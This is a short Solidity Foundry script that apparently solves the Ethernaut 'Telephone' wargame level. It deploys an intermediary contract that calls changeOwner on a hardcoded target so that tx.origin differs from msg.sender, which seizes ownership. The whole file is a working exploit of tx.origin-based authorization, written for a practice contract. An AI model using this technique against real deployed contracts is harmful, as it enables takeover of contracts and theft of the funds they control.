// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract IntermediaryContract{
    constructor(Telephone _telephone, address _newOwner){
        _telephone.changeOwner(_newOwner);
    }
}

contract TelephoneSolution is Script {

    Telephone public telephoneInstance = Telephone(0x54113a00C95ED7C916a25338145e370F4a8a7728);

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new IntermediaryContract(
            telephoneInstance, vm.envAddress("MY_ADDRESS")
        ); 
        vm.stopBroadcast();
    }
}